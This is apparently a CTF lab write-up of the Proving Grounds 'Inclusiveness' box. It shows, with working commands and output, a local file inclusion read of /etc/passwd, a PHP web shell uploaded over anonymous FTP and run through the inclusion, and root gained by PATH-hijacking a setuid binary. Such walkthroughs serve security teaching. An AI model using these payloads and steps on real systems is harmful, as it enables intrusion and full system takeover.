---
title: "Proving grounds Play: Inclusiveness"
layout: post
date: 2023-09-22 02:00
categories: writeup
---

Proving grounds Play - Inclusiveness CTF writeup.

## Nmap

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.168
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 061ba39283a57a15bd406e0c8d98277b (RSA)
|   256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)
|_  256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 80

![img](/assets/images/CTF/Proving_Grounds/Inclusiveness/web.png)

## Directory Fuzzing

robots.txt file shows `You are not a search engine! You can't read my robots.txt!`. The restriction can be bypassed by changing the useragent in the request to `GoogleBot`.

![img](/assets/images/CTF/Proving_Grounds/Inclusiveness/curl.png)

## /secret_information/

![img](/assets/images/CTF/Proving_Grounds/Inclusiveness/SI.png)

Upon clicking the `english` language button the website fetches the `en.php` file, which can be abused to read local files in the system.

## LFI Vulnerability

Send below curl command to obtain `/etc/passwd`.

```sh
curl -s -A GoogleBot http://192.168.193.14/secret_information/?lang=/etc/passwd -i

HTTP/1.1 200 OK
Date: Fri, 22 Sep 2023 07:59:18 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 2191
Content-Type: text/html; charset=UTF-8

<title>zone transfer</title>

<h2>DNS Zone Transfer Attack</h2>

<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Escalate LFI to RCE

### PORT 21: FTP

The FTP service allows anonymous login with write access to the `pub` folder. Create a php remode code execution code as below and save as shell.php.

```php
<?php
system($_GET['cmd']);
?>
```

Login to the FTP server using `anonymous` as login and password. Use the `put` command to upload the shell. Once it's uploaded send the curl request as below to check the remote code execution.

```sh
curl -s -A GoogleBot "http://192.168.193.14/secret_information/?lang=/var/ftp/pub/shell.php&cmd=id"

HTTP/1.1 200 OK
Date: Fri, 22 Sep 2023 08:09:36 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 200
Content-Type: text/html; charset=UTF-8

<title>zone transfer</title>

<h2>DNS Zone Transfer Attack</h2>

<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now obtain a reverse shell by checking the `python` version and using a python reverse shell.

**Initial Foothold Obtained**

## Privilege Escalation

Upon searching the user `tom` home directory there is a file named `rootshell` which is a compiled binary which can be run as root the owner of the file.

```sh
0K drwx------ 10 tom  tom  4.0K Feb  8  2020 .cache
 20K -rwsr-xr-x  1 root root  17K Feb  8  2020 rootshell
4.0K -rw-r--r--  1 tom  tom   448 Feb  8  2020 rootshell.c
4.0K -rw-------  1 tom  tom   684 Feb  8  2020 .ICEauthority
4.0K drwx------  3 tom  tom  4.0K Feb  8  2020 .gnupg
4.0K drwx------ 10 tom  tom  4.0K Feb  8  2020 .config
```

By running this binary will provide root shell.

### rootshell.c

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

The above c code is the one that has been compiled as `rootshell` binary. The vulnerability exists on the line 8 in where the program checks the user through `whoami` file and if the user is `tom` the program will grant access to root shell.

In order to exploit the vulnerability, the name `tom` should be printed on the whoami file and the PATH to the location of the whoami file should present as the first path where the system would check for the file named whoami.

### Exploitation

The vulnerability can be exploited as follows.

```sh
www-data@inclusiveness:/tmp$ ls
ls
www-data@inclusiveness:/tmp$ echo "printf "tom"" > whoami #code to print tom
echo "printf "tom"" > whoami
www-data@inclusiveness:/tmp$ chmod 777 whoami #make the code executable for everyone
chmod 777 whoami
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH #this ensures the /tmp is set as first in PATH variable
export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ echo $PATH #check the PATh
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #confirm /tmp has been set as first
www-data@inclusiveness:/tmp$ cd /home/tom
cd /home/tom
www-data@inclusiveness:/home/tom$ ./rootshell #run the compiled binary
./rootshell
checking if you are tom...
you are: tom
access granted.
# whoami
whoami
tom# id
id
uid=0(root) gid=33(www-data) groups=33(www-data) #root obtained
```

**Root Obtained**

Thanks for reading!

For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).